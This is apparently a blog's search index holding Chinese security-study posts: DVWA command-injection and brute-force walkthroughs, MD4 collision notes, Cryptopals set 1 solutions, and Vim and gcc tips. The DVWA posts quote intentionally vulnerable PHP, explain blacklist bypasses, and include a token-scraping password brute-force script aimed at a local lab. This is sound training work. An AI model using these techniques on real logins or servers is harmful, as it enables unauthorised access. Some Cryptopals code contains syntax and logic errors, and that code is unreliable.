<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[DVWA(2)-command injection]]></title>
    <url>%2F2017%2F11%2F22%2FDVWA2-Exec%2F</url>
    <content type="text"><![CDATA[该漏洞允许用户在服务器上执行任意命令。 该命令与 code injection 的区别在于：code injection 与注入的语言有关，比如 服务器上执行的语言为 php，那么可利用漏洞执行 php 代码。如PHP中的 require，eval() 等，都容易引发 code injection 漏洞。 而 command injection 常常发生于 服务器对输入 不加有效过滤而传给 system shell 执行，从而被恶意利用。如果被利用的程序权限较高，那么后果将是灾难性的。 常见的测试方式是利用 |管道符 &amp;和;连接符 &amp;&amp;逻辑与(前一命令执行成功，则后面命令也执行) ||逻辑或(前面命令执行失败，才执行后面的命令)等符号执行其他命令。 Low-level允许我们输入一个 IP 地址，然后输出 ping 的结果。 Low-level 下依然是没有任何防御措施，直接将 ping与 输入连接，然后传给 shell_exec() 执行。可以直接用上面的 连接符号 在 shell 中执行其他命令。 12345678910111213if( isset( $_POST[ 'Submit' ] ) ) &#123; $target = $_REQUEST[ 'ip' ]; // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' . $target ); &#125;else &#123; // *nix $cmd = shell_exec( 'ping -c 4 ' . $target ); &#125;$html .= "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125; stristr() 查找字符串首次出现位置。与 strstr() 的区别是它忽略大小写。 phpuname() 运行服务器的操作系统信息。 ‘s’参数返回“操作系统名称”，与Unix命令uname参数同理。 Medium-levelMedium-level 下，过滤了几个连接符，使用它们就不会返回结果。但还是能用 &amp; 连接多个命令。 查看源码，发现多了这么几句代码1234567// Set blacklist$substitutions = array( '&amp;&amp;' =&gt; '', ';' =&gt; '',);// Remove any of the charactars in the array (blacklist).$target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 这属于有防护的思想，但是防护能力并不好。比如将其中的 &amp;&amp; 换成 &amp; 就会更好。即使如此，用|依然能执行其他命令 high-levelhigh-level 依然采用黑名单的方式，将某些符号过滤。不过这次过滤地更全面了。 1234567891011$substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '| ' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '',); 然而这里令人很匪夷所思的是它不愿直接过滤|，导致了过滤的漏洞。其实还可以过滤掉 \ 和 空格，来进一步加强安全性。 str_replace() 按照数组中的内容进行替换时的执行逻辑为 ： 先按照array的第一行一直替换，直到没有匹配。再按照数组的第二行一直替换，直到没有匹配。再… 绕过的方式有 奇数个|，右边不跟空格 任意多个 |后跟n个空格，那么按照array第三行的规则一直消去。直到右边没有空格时，还剩下奇数个|即可。 impossible 使用 stripslashes() 删除了反斜杠 使用 explode() 将 输入按照 . 分成4组，检查每一组是否为数字。若不是4组或者某一组不是数字，则返回错误。 采用白名单的方式，只允许 数字 和 . 作为输入，十分有效。 防御 command injection 尽量避免调用 shell , 如 system() , exec() , shell_exec() 等函数 采用白名单或黑名单的方式，仔细过滤输入。 DVWA 里的 command injection 部分感觉内容非常有限，command injection 这块还有待日后完善。]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA(1)-Brute Force]]></title>
    <url>%2F2017%2F11%2F18%2FDVWA1-BruteForce%2F</url>
    <content type="text"><![CDATA[最近打算开始分析一下 dvwa 项目的源码，趁此机会再把 web安全 以及 php 的基础知识复习一遍。 既然要全部分析，那就按顺序来吧。 DVWA 的第一个项目为 Brute Force，暴力穷举。 在 dvwa的对应页面中，我们需要做的就是爆破登陆界面的账号密码。这里假设我们已经确定了 用户名为 admin ，爆破其密码。 Low-level先用 Burp Suite 抓包 现在我们使用 hydra 工具进行爆破。需要准备的内容如下： 目标 ipv url 路径 cookie 密码错误返回的消息 密码表 接下来开始爆破 因为 Low-level 下提交表单用的是 Get 方式，所以上面的 Service 参数填 http-get-form。 试错密码时页面会返回消息 Username and/or password incorrect.，这个也要填上去。 Low-level 本身比较简单，基本没有任何防御。这个密码表也是我临时构建的，所以试的次数也不多，主要是为了演示。 Medium-level在 Medium-level 中，加入了 mysqli_real_escape_string() 对输入进行过滤，应该是考虑到 sql注入。而针对 爆破，则加入了sleep(2)，在每次输入错误后等2秒再响应，这就导致了爆破的成本增加。其实如果改进一些，可以设置为每错一次，等待时间延长1倍。 除此之外也没有别的改动了，form提交方式依然是 get ，用low-level的方式依然可以爆破。在实际应用中如果 admin 的密码设得复杂的话此法可以大幅增加爆破耗时。 High-level 在 High-level 中加入了一种防御措施 – token(令牌)。每次登陆时服务端会先验证 token 正确性，再验证账号密码。查看 html 源码可以直接看见，但是每次刷新页面都会更新的一个随机数。 每次试错密码会随机 sleep 0～3秒。 延时问题不大，主要需要解决的是 token 验证问题。 这样一来直接使用工具就有一定的局限性了，不过我们可以构造脚本来解决这个问题。写一个 python 脚本： 借助 requests 库 接收html 和发送 http 请求。 借助 BeautifulSoup 库提取 html 的内容，我们用它来取出html中的 session_token 值，加入到发送的表单中去。 需要准备的： 有效cookie 密码表 下面是演示脚本。1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupimport repass_list = open('password_list.txt','r').readlines()url = "http://localhost/DVWA/vulnerabilities/brute/"cookies = dict(PHPSESSID="435ab4cd1fe6acf25ab6716c4556fa7d",security="high")response = requests.get(url,cookies=cookies)for i in pass_list : soup = BeautifulSoup(response.text,"html.parser") tag = soup.find_all('input')[3] payload = &#123;'username':'admin','password':i[:-1],'Login':'Login','user_token':tag['value']&#125; response = requests.get(url,params=payload,cookies=cookies) if not re.findall('Username and/or password incorrect.',response.text) : print('password found ! ',i) break else : print('token :'+tag['value']+'try "'+i[:-1]+'" failed.') impossibleimpossiple-level 的源码中用到了： 数据库方面使用 PHP数据对象(PDO) 和 预处理语句。使用PDO可以实现对于不同的数据库使用相同的方法查询、获取数据。PDO的定义部分见 配置文件 dvwaDatabaseConnect()函数。预处理语句可以防止 sql注入攻击。 在试错了密码之后，服务器会更新数据库，记录该账号的失败登陆次数。如果失败次数超过3次，账号会被锁定15min。如果你在账号锁定期间继续登陆，那么15min计时将会重置。锁定解除以后，每错误一次，失败次数都会加1(也就是永远大于3)。直到成功登陆，失败次数才会清零 在这样的机制下，暴力破解无法继续。 附录 可以在 源码中多次看到 $GLOBALS[&quot;___mysqli_ston&quot;] 这个变量，它的定义在 /dvwa/includes/DBMS/MYSQL.php 中，dvwa 用这个全局变量来指代 $connect=mysqli_connect(&#39;localhost&#39;,&#39;username&#39;,&#39;password&#39;,&#39;database_name&#39;); dvwaPageNewGrab() 里面存放了一些标题名啥的，不用太在意。 DVWA v1.10 , Apache 2.4.27 , mysql 5.7.20 , php 5.6.30]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dvwa登陆机制与cookie,session]]></title>
    <url>%2F2017%2F11%2F18%2Fdvwa%E7%99%BB%E9%99%86%E6%9C%BA%E5%88%B6%E4%B8%8Ecookie-session%2F</url>
    <content type="text"><![CDATA[要了解 dvwa 的架构，先看其登陆页面的机制以及其 cookie 和 session 的设置。 dvwa 的自定义函数基本都在 /dvwa/includes/dvwaPage.inc.php 中，从每个文件的 require应该就能看出来。以下简称该文件为 配置文件。 sessiondvwa 中的 session 主要用来 检查登陆、生成token。 session_start() 在 /dvwa/includes/dvwaPage.inc.php 中。 在 523-545 行集中定义了有关 token 的 生成generateSessionToken()、插入表单tokenField()、检查checkToken()、销毁destroySessionToken() 函数。 其中生成的方式为 $_SESSION[ &#39;session_token&#39; ] = md5( uniqid() ); cookiecookie 主要用来控制 security-levels 登陆与检查登陆机制PHPSESSID 和 security 两个 cookie 在运行配置文件时就已经自动生成，所以并不能用它来证明你已登陆。确定你是否登陆的是你这个 PHPSESSID 对应的 session 在 服务器中是否保存着值。 登陆过程主要看 login.php。 登陆的时候首先包含并运行 配置文件，并在登陆验证成功后调用 dvwaLogin() ，进而调用dvwaSessionGrab()生成默认$_SESSION[&#39;dvwa&#39;]，通过 dvwaSession变量修改 $_SESSION[&#39;dvwa&#39;]。最后用户名存放在 $_SESSION[&#39;dvwa&#39;][&#39;username&#39;] 中。 在登陆成功之后的各个页面中，都有这么个函数：dvwaPageStartup()，该函数是拿来检查用户是否登陆的。它调用dvwaIsLoggedIn() 来判断是否登陆。该函数返回 dvwaSession[&#39;username&#39;] 是否设置 的bool值。 dvwaSessionGrab()函数 在没有 $_SESSION[&#39;dvwa&#39;] 数组时创建它。返回$_SESSION[&#39;dvwa&#39;] 的值。 $dvwaSession = &amp;$_SESSION[&#39;dvwa&#39;]]]></content>
      <tags>
        <tag>dvwa</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MD4 Collisions]]></title>
    <url>%2F2017%2F11%2F06%2Fmd4-collision%2F</url>
    <content type="text"><![CDATA[cryptopals challenge 55 MD4 介绍 1990年出现，基于 Merkle-Damgard 架构。它影响了后来的 MD5，SHA1等算法。 hash值长度128bits. 过程 将 message pad 成 512 bit 的倍数 按顺序将每一组 512 bit 通过 compression function 压缩成 128bit，最后一组得到的128bit就是hash值 压缩函数 compression function 共有3轮，每一轮用到一个不同的函数 $F(X,Y,Z)=(X\wedge Y)\vee(\daleth X\wedge Z)$ $G(X,Y,Z)=(X\wedge Y)\vee (X\wedge Z)\vee(Y\wedge Z)$ $H(X,Y,Z)=X\oplus Y\oplus Z$ 上面的 X,Y,Z都是 32bit的字，与或非等运算都是按位运算 三轮的计算分别是： $\phi _0(a,b,c,d,m_k,s)=((a+F(b,c,d)+m_k)\ mod\ 2^{32})\lll s$ $\phi _1(a,b,c,d,m_k,s)=((a+G(b,c,d)+m_k+0x5a827999)\ mod\ 2^{32})\lll s$ $\phi _2(a,b,c,d,m_k,s)=((a+H(b,c,d)+m_k+0x6ed9eba1)\ mod\ 2^{32})\lll s$ 其中s是一个step-dependence constant，$\lll$s 是循环左移s位。 a,b,c,d的初始值为 0x67452301，0xefcdab89，0x98badcfe，0x10325476 对于一个512bit长的block，先将它分成16块(m&lt;sub&gt;0&lt;/sub&gt;,m&lt;/sub&gt;1&lt;/sub&gt;...m&lt;sub&gt;15&lt;/sub&gt;)，每块32bit，压缩函数这样工作： 令(aa,bb,cc,dd)作为chaining variable 其中如果该block是第一个block，那么 chaining variable 就设为初始的a,b,c,d的值，如果不是，那就用前一block输出的值。每一轮有16步，4个chaining variable 在这16步中分别会更新4次。总共3轮下来更新了12次。 执行下面的算式，共48步： 对于 j=0,1,2，最开始的a,b,c,d为前面的aa,bb,cc,dd $a=\phi _j(a,b,c,d,m_i,s_1)$ $d=\phi _j(d,a,b,c,m_i',s_2)$ $c=\phi _j(c,d,a,b,m_i'',s_3)$ $b=\phi _j(b,c,d,a,m_i''',s_4)$ 第一轮 j=0，[$m_i,m_i',m_i'',m_i'''$] 为 [0 1 2 3]，[4 5 6 7]，[8 9 10 11]，[12 13 14 15]，$s_1,s_2,s_3,s_4$分别为3 7 11 19 第二轮 j=1，[$m_i,m_i',m_i'',m_i'''$] 为 [0 4 8 12]，[1 5 9 13]，[2 6 10 14]，[3 7 11 15]，$s_1,s_2,s_3,s_4$分别为3 5 9 13 第三轮 j=2，[$m_i,m_i',m_i'',m_i'''$] 为 [0 8 4 12]，[2 10 6 14]，[1 9 5 13]，[3 11 7 15]，$s_1,s_2,s_3,s_4$分别为3 9 11 15 最终得到 $a_{12},b_{12},c_{12},d_{12}$ 将计算得到的 a,b,c,d 与输入的 aa,bb,cc,dd进行下列计算 $aa=(a+aa)\ mod\ 2^{32}$ $bb=(b+bb)\ mod\ 2^{32}$ $cc=(c+cc)\ mod\ 2^{32}$ $dd=(d+dd)\ mod\ 2^{32}$ 最终得到的 aa,bb,cc,dd作为该block的输出，给到下一个block 如果当前block是最后一个，那么 aa|bb|cc|dd 这128bit就是最终hash。 Differential cryptanalysis 差分密码分析 下面是 wikipedia 中对于 差分密码分析的一些解释： 这是对于分组密码的首选分析方法。它属于 chosen-plaintext attack 广义上说，这是研究 输入的不同能如何影响输出的不同。 选择多对明文，每对明文之间的差别是 相同的 计算这些明文产生的密文的差别 从统计的角度来分析它们的规律。 一对明文的差别与一对密文的差别这两个值合起来称为 differential，它的统计学性质取决于 加密用的 S-box 如果某个 密文差别 比较频繁，那么就可以断定它不是随机的。 Chosen-Message Pre-Image Attack to MD4 This attack can find collisions with probability 2^−2^ to 2^−6^ and with complexity less than 2^8^ MD4 hash operations 如果某 Message 满足了一些特定的限制条件，使得对其进行少许改变能导致 hash collision，那么称此 Message 为 Weak Message. 对于任何 weak message M，满足下面性质的 M' 都会与其 碰撞。 $\Delta M=M'-M=(\Delta m_0,\Delta m_1,... ...,\Delta m_{15})$ such that: $\Delta m_1=2^{31},\Delta m_2=2^{31} - 2^{28},\Delta m_{12}=-2^{16},\Delta m_i=0,0\leqslant i\leqslant 15,i\neq 1,2,12$ 这是 weak message 需要满足的条件： 总共是 121个限制条件，所以任意一条message，其满足上述条件的概率为2^-121^ 那么，此攻击的核心就在于：如何构造满足上面限制的 message 第一轮 对于MD4 的第一轮16步来说，要构造满足上述条件的message还是比较容易的。 对于 M[i]，执行类似下面的步骤： 按照原步骤计算 a&lt;sub&gt;1&lt;/sub&gt; $a_1=((a_0+F(b_0,c_0,d_0)+m[0])\ mod\ 2^{32})\lll 3$ 根据限制条件，构造 a&lt;sub&gt;1&lt;/sub&gt;' $a_1'=a_1\oplus((a_1\oplus b_0)\wedge(1\ll i))$ 调整 m[0]' $m[0]'=(a_1'\ggg 3)-a_0-F(b_0,c_0,d_0)\ mod\ 2^{32}$ 如此往复 第二轮 第二轮就没有第一轮这么简单了。虽然第二轮中的限制条件与第一轮中的没有重叠部分，但是如果在第二轮中改变了 m[0]，那么第一轮中计算的 a1 就也跟着变了，a1 变了那么后面所有跟 a1 有关的限制条件的计算也都白费了。 论文中给出的解决方法是：调整 m[i]，使得当 a1 改变的时候，其他与其相关的 chaining variables 保持不变。 下面说一说如何实现它： 第二轮的第一步： $a_5=((a_4+G(b_4,c_4,d_4)+m[0]+0x5a827999)\ mod\ 2^{32})\lll 3$ 那么 m[0]变为 $m[0]'=(a_5'\ggg 3)-a_4-G(b_4,c_4,d_4)-0x5a827999\ mod\ 2^{32}$ a1也随之更新 $a_1'=((a_0+F(b_0,c_0,d_0)+m[0]')\ mod\ 2^{32})\lll 3$ d1 本来也要按照下式随着 a1 更新 $d_1=((d_0+F(a_1,b_0,c_0)+m[1])\ mod\ 2^{32})\lll 7$ 但是我们来重新构造 m[1]，使得 d1 不需要更新 $m[1]'=(d_1\ggg 7)-d_0-F(a_1',b_0,c_0)\ mod\ 2^{32}$ m[2],m[3],m[4] 也同理 $m[2]'=(c_1\ggg 11)-c_0-F(d_1, a_1', b_0)\ mod 2^{32}$ $m[3]' = (b_1 \ggg 19) - b_0 - f(c_1, d_1, a_1') \mod 2^{32} $ $m[4]' = (a_2 \ggg 3) - a_1' - f(b_1, c_1, d_1) \mod 2^{32} $ 改变了这些以后，第一轮又可以顺利执行了。]]></content>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cryptopal-set1]]></title>
    <url>%2F2017%2F10%2F22%2FCryptopal-set1%2F</url>
    <content type="text"><![CDATA[一个与密码学有关的题集，适合入门。我在结合了网上的解法后，做了些笔记，供以后参考。 题目链接 以下所有代码均使用 Python3 1. Convert hex to base64 题目大意：提供了一串hex encoded字符串 1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736要求将其转换为 base64 编码并且题目中推荐用 字节型数据 进行操作。 关于base64编码，python3 中有原生库base64可用，但是base64.encode() 只能接收 字节串。 binascii.unhexlify() 将 16进制字符串 转换为 ASCII编码的字节串。 base64.b64encode() 接收/输出 字节串所以结果需要用 decode(‘ascii’) 转换为 字符串(字符串转字节串可以用encode(‘ascii’) )。 1234567import binasciiimport base64x = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'decode = binascii.unhexlify(x)b = base64.b64encode(decode).decode('ascii')print(b) 2. Fixed XOR 题目大意：要求写一个函数，接受2个同长度的输入，并产生它们xor后的值。比如：1c0111001f010100061a024b53535009181cxor686974207468652062756c6c277320657965will produce746865206b696420646f6e277420706c6179 1234567891011import binasciifrom Crypto.Util.strxor import strxorencoded1 = '1c0111001f010100061a024b53535009181c'encoded2 = '686974207468652062756c6c277320657965's = binascii.unhexlify(encoded1)t = binascii.unhexlify(encoded2)u = strxor(s, t)print(u) Crypto.Util.strxor.strxor() 函数接收 2 个等长字符串，将它们异或，返回 ASCII 形式的结果。 下面是不用库函数的解法： python 中的 按位异或操作符^ 只能操作 数字，而不能是 string。12345678910def xor(str1,str2): result = hex(int(str1,16)^int(str2,16) ) return result print(b[2:])str1 = "1c0111001f010100061a024b53535009181c"str2 = "686974207468652062756c6c277320657965"res = xor(str1,str2)print(res)print(binascii.unhexlify(res)) 3. Single-byte XOR cipher 题目大意：给一个 hex encoded string1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736它是被一个string被一个字符 xor 后得到的。找到这个字符，并复原 string 在这个题目中我们需要对字符 key 以ASCII编码的范围(即0～255) 进行一次穷举，然后将所有的256种情况中可能性最大的情况输出 一般结果中空格最多的最有可能是明文，而本道题确实满足这点。 12345import binasciiencoded = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736'nums = binascii.unhexlify(encoded)strings = (''.join(chr(num ^ key) for num in nums) for key in range(256))print( max(strings, key=lambda s: s.count(' ')) ) 或者按照题目中推荐的，建立字母频率表，更加严谨地解该题。这也有利于解后面的题目。 12345678910111213141516171819202122232425262728293031import binasciifrom Crypto.Util.strxor import strxor_c# From http://www.data-compression.com/english.htmlfreqs = &#123; 'a': 0.0651738,'b': 0.0124248,'c': 0.0217339 'd': 0.0349835, 'e': 0.1041442,'f': 0.0197881,'g': 0.0158610,'h': 0.0492888, 'i': 0.0558094,'j': 0.0009033,'k': 0.0050529,'l': 0.0331490, 'm': 0.0202124,'n': 0.0564513,'o': 0.0596302,'p': 0.0137645, 'q': 0.0008606,'r': 0.0497563,'s': 0.0515760,'t': 0.0729357, 'u': 0.0225134,'v': 0.0082903,'w': 0.0171272,'x': 0.0013692, 'y': 0.0145984,'z': 0.0007836,' ': 0.1918182 &#125; #可以看到空格的频率远高于任何字母def score(s): #返回每个字符串的总得分数 score = 0 for i in s: c = chr(i).lower() if c in freqs: score += freqs[c] return scoredef breakSingleByteXOR(s): #返回key的ASCII码以及得分最高的字符串 def getkey(p): return score(p[1]) return max( [ (i, strxor_c(s, i)) for i in range(0, 256)] , key=getkey) if __name__ == '__main__': encodedS = '1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736' s = binascii.unhexlify(encodedS) print(breakSingleByteXOR(s)) Crypto.Util.strxor.strxor_c() 函数接收一个字符串，一个int数字(0~255)，用该int数字分别与 字符串中的各个字符xor，返回 ASCII 编码的结果 4. Detect single-character XOR 题目大意：提供了一个文件，里面是 n 个长度60的string，其中一个string是被一个 single-character xor 后得到的，找到它。 题目推荐用题3中的得分函数来辅助完成，如果完成了题3,那么此题应该问题不大 1234567891011121314151617181920212223import binasciiimport challenge3def decodeLines(filename): #构建一个生成器，每次返回文件的一行 f = open(filename, 'r') for line in f: if line[-1] == '\n': line = line[:-1] s = binascii.unhexlify(line) yield sdef findSingleByteXOR(lines): #返回目标行的行数以及内容 brokenLines = [challenge3.breakSingleByteXOR(x)[1] for x in lines] #列表brokenlines是文件的每一行各自得分最高情况的集合 def score(i): return challenge3.score(brokenLines[i]) #从每一行的得分最高情况中再选出得分最高的一行 maxI = max(range(len(brokenLines)), key=score) return (maxI+1, brokenLines[maxI])if __name__ == '__main__': print(findSingleByteXOR(decodeLines('4.txt'))) 5. Implement repreating-key XOR 题目大意：提供一串英文，要求用 key ICE 对这段英文进行异或。Burning ‘em, if you ain’t quick and nimbleI go crazy when I hear a cymbal 如果知道 字节串 的一个性质，那么这个题就十分简单。我们都知道 字符串 在python中可视为一个 数组，单字符为其元素。s1 = ‘str’ ，则 s1[1] -&gt; ‘t’而 ==字节串 也可以视为一个数组，元素是 其字符的ASCII码，即int==s2 = b’str’ ，则 s2[1] -&gt; 116既然元素是 int，那么就可以直接用 按位异或符^进行异或了。 bytes() 将 int 数组按照 ASCII 转换为字节串 12345678910111213import binasciidef RepeatingKeyXor(s, key): return bytes([s[i] ^ key[i % len(key)] for i in range(len(s))]) #接受一个int数组，bytes()会按照ASCII返回对应的字节串x = b'''Burning 'em, if you ain't quick and nimbleI go crazy when I hear a cymbal'''key = b'ICE'y = RepeatingKeyXor(x, key)encodedY = binascii.hexlify(y).decode('ascii')print(encodedY) 6.Break repeating-key XOR 题目大意：提供一个文件，其内容是明文经过 repeating-key xor 后 base64 编码得到的。要求将其解密。 这个题目可以说是 Set1 解题过程中的一道坎。不过还好题目给出了解题思路。 先说一个读取文件的小细节。文件内容是有许多换行符的，那么这些换行符是否会对 base64 解密产生影响呢？ base64的编码内容中只有A-Z a-z 0-9 / + 64个字符，以及凑数的=，没有 \n ，所以并不需要担心文件内容中的换行符会对解码结果产生影响。 解题第一步，我们需要写一个函数求出 2 string 间的 hamming 距离。 求 2个string 的 hamming 距离可以通过 将 2 个 string xor，然后数出结果中有几个 bit 为 1 。 然后需要解决的就是得到 KEYSIZE ，题目提示中给出的方式是： 对于每一个 KEYSIZE，将密文按照 KEYSIZE 长度分成若干组，每个组有 KEYSIZE 个字符。 从其中取出几组(比如 4组)，组与组之间计算 hamming distance/KEYSIZE 的值。 然后计算 这些值的总和/这些值的数量，得到一个平均值。最终得到的这个值最小，对应的那个 KEYSIZE 应该就是 目标KEYSIZE 知道了 KEYSIZE 后，执行最后的解密阶段： 将密文按照 KEYSIZE 分组 取每个组的第1个字符，得到一个集合，再取每个组的第2个字符得到另一个集合… …(相当于求转置矩阵) 将每一个集合看作是一个 single-byte XOR 的题目，解出 key 用这个 key 对 base64 解码的密文 xor ，得到明文 itertools.zip_longest()可以方便地求转置矩阵。它取出所有参数的第1个元素组成一个元组，再取出所有第2个元素组成一个元组… … 1234567891011121314151617181920212223242526272829303132333435import base64import itertoolsimport single_byte_XOR as challenge3import repeating_key_XOR as challenge5#calculate the hamming distance between str1 and str2def hamming(str1,str2): return sum([ bin(str1[i]^str2[i]).count('1') for i in range(len(str1)) ]) #由于字节串的每个元素都是数字，所以可以直接逐个xor ，然后转bin字符串，数出 1 的个数。#求出可能的KEYSIZEdef normalizedEditDistance(x, k): blocks = [x[i:i+k] for i in range(0, len(x), k)][0:8] #按 k 为长度分组 pairs = list(itertools.combinations(blocks, 2)) scores = [hamming(p[0], p[1])/float(k) for p in pairs] return sum(scores) / len(scores) #len(scores) is 6 because there are only 6 combinations of 4 blocks#将密文按KEYSIZE分组，取出每组的第1、2、3...位，得到block1def getKey(x,k): blocks = [ x[i:i+k] for i in range(0,len(x),k) ] key = b'' transposedBlocks = list(itertools.zip_longest(*blocks,fillvalue=0)) key = [challenge3.breakSingleByteXOR(bytes(i))[0] for i in transposedBlocks] return bytes(key)if __name__ == "__main__" : data = base64.b64decode(open('6.txt','r').read()) keysize = min(range(2, 41), key=lambda k: normalizedEditDistance(data, k)) key = getKey(data,keysize) plaintext = challenge5.encodeRepeatingKeyXor(data,key).decode('ascii') print(plaintext) 7. AES in ECB mode 题目大意：Base64 编码的内容通过AES-128 in ECB mode 加密，密钥为YELLOW SUBMARIME。将其解密。 ECB 是 Block cipher mode of operation 中最简单的一种。 直接调用 Crypto.Cipher 库解决。 123456789import base64from Crypto.Cipher import AESdata = base64.b64decode(open('7.txt','r').read())key = b'YELLOW SUBMARINE'cipher = AES.new(key,AES.MODE_ECB)result = cipher.decrypt(data)print(result.decode('ascii')) 8. Detect AES in ECB mode 一个文件中有许多段 hex-encoded 密文。其中有一段用 AES-ECB 模式加密。找出它。注意 ECB 模式是无状态(stateless)且确定性(deterministic)的；同样的 16 字节长明文块 加密会得到 同样的 16 字节密文块。 按照题目的提示，我们将每一段密文按照 16字节长度进行分组，计算两两分组之间是否相同。 1234567891011121314151617181920import detect-single-byte-xor as challenge4import itertoolslines = challenge4.decodeLines('8.txt')def score(x): lens = 16 blocks = [x[i:i+k] for i in range(0,len(x),lens) pairs = itertools.combinations(blocks,2) count = 0 for p in pairs: if p[0] = p[1]: count += 1 return countlinenumber = 1for l in lines: if score(l)&gt;0: print(linenumber) linenumber += 1]]></content>
      <tags>
        <tag>cryptography</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vim-base]]></title>
    <url>%2F2017%2F10%2F18%2FVim-base%2F</url>
    <content type="text"><![CDATA[快速移动0 行首 ^ 第一个非空格字符前$ 行尾- 上一行行首+ 下一行行首 nG 比如100G，移动到第100行G 移动到尾行 (End也可以)ctrl+u 内容向上移动半屏ctrl+d 内容向下移动半屏 h,j,k,l分别为左移，下移，上移，右移 模式介绍Vim 有 4 种模式，正常模式，插入模式，可视化模式，命令模式 正常模式 ： 主要用于浏览。打开vim就是正常模式，任何模式下按ESC进入正常模式 插入模式 ： 正常模式下按 i光标前插入 a光标后插入 o光标下新开一行插入 s删除光标处插入 等等 命令模式 ： 输入 ： 进入。多用于操作文件、设置编辑器 可视模式 ： 正常模式下，先将光标移动到想要的位置，然后进入开始选择。 按v进入可视模式，以字符为单位 按V进入可视行模式，以行为单位 按ctrl+v进入可视块模式，以一个矩形选取对象 正常模式u 撤回 ctrl+u 取消撤回yy 复制当前行p 粘贴dd 剪切当前行 插入模式 ctrl+[：退出insert模式 ctrl+o：执行一个正常模式下的操作。 命令模式 保存退出 ： :wq 不保存退出 ： !q 查找 ： 输入/，在后面跟上pattern，此时光标会停在查找结果的前一个字符处。按n查找下一个，按N查找上一个默认大小写敏感。如果想不敏感查找则在后面加上\c 替换 ： 11s/a/b/g 将第11行所有 ‘a’ 都替换成 ‘b’ 。g表示所有 %s/a/b/ 将每一行的第一个a换成b 3,6s/a/b/s 将第3～6行的所有 a 换成 b 可用 . 表示当前行，$表示最后一行 可视模式该模式主要是为了选取。熟练掌握快速移动，能更快地配合此模式。 复制y (复制内容将暂时保存在vim的寄存器中。) 粘贴p 剪切d 记录 查看记录:reg 这个命令会显示以下的缓存内容： “ 最后一次操作内容0 最近一次复制内容，1~9 最近删除内容。a-z 在指定时可用*和+ 外部剪切板. 最近插入文本: 最近命令% 当前文件名/ 最近的搜索模式 其中，外部粘贴板只有在安装了GVim之后才支持 (正常模式下) 粘贴外部代码 &quot;+P 或者 &quot;*P (注意引号) 复制到外部剪切板 &quot;+Y 使用指定寄存器在正常模式下，按q，再按随机一个字母，则窗口下方会出现recording 字样此时你输入的内容会被记录下来。再按q退出记录。这样你在记录的期间输入的代码就可以被很方便地调用了。这个功能在有重复代码比较多的地方非常有用。比如 html 的标签等。 举个例子，我们使用记录来避免写 html 代码时千篇一律的开头格式(在正常模式下)：按qa 记录将被保存在代号 a 的缓存中1G 跳转到第一行切换到 Insert 模式，输入 html 的开头标签，然后切换到正常模式G 跳转到最后一行同样地，输入 html 的结尾标签，切换到正常模式q 记录完成此时，按下@a 那么你刚才记录的代码就会被调用。 其他Vim的配置文件 ~/.vimrc 多标签页/窗口 :tabe 文件名 打开新的文件作为标签页 gt 切换下一个标签 gT 切换上一个标签 :tabc 关闭当前标签页 :split 窗口名 新建窗口 :vsplit 窗口名 纵向新建窗口 也可写成 :sp :vsp ctrl+w+j/k 切换窗口 ctrl+w 双击 快速切换窗口 :q! 或 :close 退出窗口 不同进制vim -b 以二进制打开文件 现在我们以 16进制 来查看一张 jpeg 格式的图片vim picture.jpeg -b 先以二进制打开然后在命令行模式输入 :%!xxd 就可以以16进制查看了 编辑完以后，我们要将其还原为二进制文件，不然文件会无法打开:%!xxd -r (参数 -r 将16进制还原成二进制) 设置显示行号在正常模式下:set number 显示行号:set nonu 不显示行号:set mouse=a 这样在用鼠标进行选取时，不会将行号也选取到 如果想要每次打开vim时都显示行号，则打开/etc/vim/vimrc 在其中加上set number即可]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gcc_base]]></title>
    <url>%2F2017%2F10%2F18%2Fgcc-base%2F</url>
    <content type="text"><![CDATA[快速编译1gcc test.c -o test 直接将源文件 预处理，汇编，编译，链接 成可执行文件。输出文件默认为a.out 。这里我们通过 -o 设置为 test 分步编译程序编译大概需要经过 预处理(Precessing)，编译(Compilation)，汇编(Assembly)，链接(Linking)。 预处理主要是 处理宏定义、处理 #include 、删除注释等。 1gcc -E test.c -o test.i 然后就可以在 test.i 中看到 预处理后的代码了。 如果不加 -o 参数，可能会输出到屏幕 编译编译过程 就是把预处理后的文件经过词法分析、语法分析、语义分析以及优化后的汇编代码。 1gcc -S test.i 或者直接1gcc -S test.c (加上include有时会出错)生成 test.s 文件。 不过上面生成的 .s 汇编代码语法是 AT&amp;T 的，要转换成我们比较熟悉的 intel 语法，可以这样写：1gcc -S -masm:intel test.c 汇编将汇编指令转变成机器指令，即二进制目标文件。 1gcc -c test.c 得到 test.o 链接链接 的主要作用是将程序的各模块间的相互作用处理好。其主要过程是 地址和空间分配，符号决议(Symbol Resolution)，重定位等。链接分为静态链接和动态链接。 1gcc test.o -o test 如果不指定 -o ，则默认输出 a.out 文件 最后给一张 gcc –help 中的截图。]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlmap之POST表单注入]]></title>
    <url>%2F2017%2F09%2F29%2Fsqlmap%E4%B9%8BPOST%E8%A1%A8%E5%8D%95%E6%B3%A8%E5%85%A5%2F</url>
